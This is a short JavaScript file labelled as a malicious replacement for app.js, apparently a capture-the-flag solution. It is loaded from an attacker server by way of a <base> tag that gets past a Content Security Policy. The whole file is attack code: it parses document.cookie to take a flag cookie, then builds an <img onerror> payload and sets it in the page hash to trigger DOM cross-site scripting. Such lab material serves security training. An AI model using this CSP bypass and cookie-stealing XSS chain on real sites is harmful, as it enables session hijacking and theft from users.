// Malicious version of app.js
console.warn("MALICIOUS app.js loaded! CSP Bypassed via <base> tag from attacker server.");
console.log("Running in victim's context: " + document.domain);

// Function to get a specific cookie's value and decode it
function getCookieValue(name) {
    const cookies = document.cookie.split(';'); // Split into individual cookies: "name1=value1", "name2=value2"
    for (let i = 0; i < cookies.length; i++) {
        let cookie = cookies[i].trim(); // Remove leading/trailing whitespace
        // Does this cookie string begin with the name we want, followed by '='?
        if (cookie.startsWith(name + '=')) {
            // Yes, extract the value part (everything after "name=")
            let cookieValue = cookie.substring(name.length + 1);
            // Decode the URL-encoded characters (like %7B for '{', %7D for '}')
            return decodeURIComponent(cookieValue);
        }
    }
    return null; // Cookie not found
}

// The name of the cookie containing the flag
const flagCookieName = 'DOMinionSecret';

// Get the decoded flag value
const stolenFlag = getCookieValue(flagCookieName);

// Display the flag in an alert
if (stolenFlag) {
    alert(`[ATTACKER] CSP Bypassed! The Secret DOMinion Flag is: ${stolenFlag}`);
} else {
    alert(`[ATTACKER] CSP Bypassed! But couldn't find the cookie: ${flagCookieName}. Verify it's set on the victim page.`);
}

// Now, trigger the DOM XSS on the victim page to show we have full control
// This payload will also display the flag, demonstrating the DOM XSS impact.
// For the DOM XSS payload, we need a more concise way to get and decode the cookie inline.
const domXssPayload = `<img src=x onerror="
    let flag = null;
    document.cookie.split(';').forEach(c => {
        const parts = c.trim().split('=');
        if (parts[0] === 'DOMinionSecret') {
            flag = decodeURIComponent(parts[1] || '');
        }
    });
    alert('[ATTACKER] DOM XSS Triggered! Flag again: ' + (flag || 'NOT FOUND IN DOM XSS'));
">`;

// Set the hash. The 'hashchange' listener on the victim page will pick this up.
window.location.hash = `#${encodeURIComponent(domXssPayload)}`;

console.warn("[ATTACKER] Malicious script has set the hash to trigger DOM XSS on the victim page.");
